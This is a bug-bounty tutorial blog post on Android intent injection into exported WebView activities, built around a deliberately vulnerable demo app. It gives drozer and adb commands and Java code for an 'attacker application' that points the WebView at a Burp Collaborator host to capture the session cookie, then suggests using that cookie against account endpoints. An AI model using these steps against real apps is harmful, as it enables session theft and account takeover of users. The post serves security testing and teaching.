---
title: One Approach towards Android Bug Bounty
author: nirajkharel
date: 2026-01-01 14:10:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android]
render_with_liquid: false
---


Last month, I explored bug bounties on Android applications and discovered a couple of issues related to Exported Activities and Intent Injections. These vulnerabilities were either unreported or reported in a way that underestimated their impact, categorizing them as low severity or informational.

In this blog, I aim to share insights into different methods for identifying such issues and strategies to escalate their impact to High or Critical severity. Please note that this is not the only approach but rather one specific type of vulnerability I focused on during my tests.

So What is Exported Activity? Intent Injection? Insecure WebView? Account Takeover?

I am not going to describe what an activity is but Android application is designed to be sandboxed and so its activities. Unless exported, activities of one particular application cannot be accessed by any other application on the device.

Activities are not exported by default, but there are multiple ways for an activity to be exported. One being **"exported=true"** and another being **"\<intent-filter\>"**. On the activity where intent filter has been defined, its exported by default unless the **"exported=false"** has been defined. Most of the times, the static analyser or tools that we use only covers the **"exported=true"** part and you might want to check the intent filter manually while you go through the Android Manifest file.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-1.png">

One approach of identifying exported activities is manual as defined earlier and next one can be through a drozer through the drozer.

Observe that two activities are exported on the application.

```bash
dz> run app.activity.info -a com.root3d.intentinjection
Attempting to run shell module
Package: com.root3d.intentinjection
  com.root3d.intentinjection.MainActivity
    Permission: null
  com.root3d.intentinjection.PrivacyPolicy
    Permission: null
```

So what does an exported activity means? It means that it can be accessed by any other application. Is it vulnerable right now? may be, may not be. But if you reported this as an issue, it will probably led to either informative/NA or Low if you are lucky.

So how can you leverage the impact for this? Navigate to the corresponding activity, on this case, **PrivacyPolicy**. 
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-2.png">

Here comes the intent injection to open redirection part. But how?

As you read about the open redirection on the mobile application, it surely means that its an webapplication/website based attack or vulnerability. How how can this be possible on the mobile application. This means we need to check if the web URL or the web application has been referenced or integrated into the mobile application which is done through the almighty **webview**. So always look if the webview has been implemented. You can either search for the webview keyword or see if it has been initialised as we see on the **highlight-1**.

```java
private WebView webview;

// Or,
webview.loadUrl();
```

Lets skip the highlight-2 and highlight-3 for a timebeing and jump into 4 and 6. There you can see that it checks for the extra string parameter. What does **intent.getStringExtra** means? It means while the activity is called or triggered, it also looks if any other extra parameters or value has been passed on it in-exact the parameter named as **privacy-url**. 

The highlight-6 shows that it checks if the privacy-url is provided while calling the activity and if that contains any string character or not. If yes, it calls the **webview.loadUrl()** function with the **privacy-url** as the parameter. Why does it do so? Does it happens often? It might not be simple as it has been shown on the vulnerable application but there would be many instances on the activity where it requires extra parameter, generally while loading the privacy policies, terms and conditions and oauth-url as well.

So we know that it takes extra parameter and loads the webview as per we pass it as an intent. So why not load the arbitrary URL into it.

Use the below ADB command:

But what happens if you directly trigger the activity without passing any extra parameters? It will work as intended and would open the legitimate URL.
```
adb shell am start -n com.root3d.intentinjection/com.root3d.intentinjection.PrivacyPolicy
```

Execute the same above command with the extra string as mentioned below and see if you can load arbitrary URL
```
adb shell am start -n com.root3d.intentinjection/com.root3d.intentinjection.PrivacyPolicy --es privacy-url "https://google.com"
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-3.png">


See now you have successfully performed open redirection on the mobile application. But what happends when you submit this issue for your bounties. Nothing much as adb can access any private activity on the mobile application and also you have rooted your device right?

Example, we do have additional one activity called **HomeActivitycom.root3d.intentinjection.HomeActivity** but it has not been exported. Let's try if we can load the arbitrary URL into that activity using adb.

```bash
adb shell am start -n com.root3d.intentinjection/com.root3d.intentinjection.HomeActivity --es blog-url "https://google.com"
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-4.png">

Was that vulnerable? May be, you can report it mentioning that the URL validation has not been performed. Will you get the bounties? I would have given you, but they, no.

You need to do proper exploitation inorder to be it a valid and you cannot exploit this issue until there is something like Intent Redirection vulnerability.

So never just collect the activity and execute the adb command, see, analyse and then only report if that is exported.

Lets forget this HomeActivity part and focus on the PrivacyPolicy one. So before your andreline rush to submit the report, we need to be able to explain them that any other application would be able to load the URL into their application. Until then our issue would not be applicable as they would not accept the issue if you need a physical access into the device and for adb to be able to execute, you would need.

So, lets develop an android application i.e. attacker application. What does this below code do?

Its a simple application which opens the vulnerable activity and will send an extra intent as privacy-url to load "https://google.com" into that activity.

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent intent = new Intent();
        intent.setClassName("com.root3d.intentinjection","com.root3d.intentinjection.PrivacyPolicy");

        intent.putExtra("privacy-url","https://google.com");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        startActivity(intent);
    }

}
```

You can create an empty activity on your Android studion and paste this code. Replace the package name and activity name with the vulnerable one and pass the accepted parameter. You should be able to perform an open redirection to the vulnerable app through this app once executed.

The code block `intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);` might be needed sometime as while executing the attacker application, instead of loading the arbitrary URL into the vulnerable application, sometimes it loads to the current attacker application. So it launches the activity in a new task separate from the current task.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-5.png">  


Until now they would treat this issue as Low or Medium because its just an open redirection. 

It might be the good idea to report until now if you have no option to login or register into the application. Example if the application needs a valid government document of hulululu country. 

But if incase you can login or register into the application and it any of the activity is vulnerable to intent injection to open redirection, you can probably exfiltrate the session cookie of the user through the vulnerable application. Why? Because it sends a GET request to the arbitrary URL with the session cookie on the request header and believe me, most of the application do. To restrict the application to send the session cookie along it needs to load the URL using this method **loadUrlWithoutCookies(view, url);** which is hardly implemented on the application.

So instead of loading your fancy portfolio into the webview. You can develop the android application as per below to send the session cookie into your controlled domain. For example Burp Collaborator.

This code is similar as above but just the modification on the URL.

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent intent = new Intent();
        intent.setClassName("com.root3d.intentinjection","com.root3d.intentinjection.PrivacyPolicy");

        intent.putExtra("privacy-url","https://f1hsbzbz62ixdg783ucnuwu2jtpkda1z.oastify.com");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        startActivity(intent);
    }

}
```

Now the attacker application that you have created can exfiltrate the session cookie and then you can now use that session cookie as a victim user.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-6.png">

But do not just end here because you haven't done anything with the session cookie, go through the application source code, identify the API endpoints like for example **/delete/users** **/update/profile** **/update/email** **/api/profile** and try to provide an impact on the Confidentialy, Integrity and Availability as well. Check if you can get the profile details, check if you can modify the user details like email address, mobile numbers, and also check if you can delete the current user by using the session cookie.

On this way you can have the maximum impact on the application.

Please note that the blogs has been paraphrased using ChatGPT. Why? I would like to write another blog on the time that I adjust my grammar.